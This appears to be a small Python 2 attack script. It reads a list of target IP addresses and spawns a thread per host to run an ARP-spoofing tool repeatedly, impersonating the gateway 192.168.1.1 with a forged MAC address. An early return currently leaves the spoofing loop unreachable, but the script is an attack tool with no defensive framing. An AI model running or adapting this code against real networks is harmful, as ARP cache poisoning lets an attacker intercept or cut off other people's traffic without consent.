# -- coding:utf-8 --

import sys,os,os.path,time,string,threading


iplist=[]
f = open('iplist.txt','r')
iplist = map(string.strip,f.readlines())
f.close()



def thread_arp(delta,):
	print delta
	if delta[0]=='#':
		print 'skip:',delta
		return
	return
	print 'thread starting...'
	cmd = "arpsf -onlycheat -t %s -c 192.168.1.1 00aabbccddeeff -time 1000 < 1.param"%(delta)
	while True:
		time.sleep(10)
		print cmd
		os.system(cmd)
	


for host in iplist:
	
	if len(host):
		thread = threading.Thread(target=thread_arp,args=(host,))
		thread.start()

while True:
	time.sleep(1)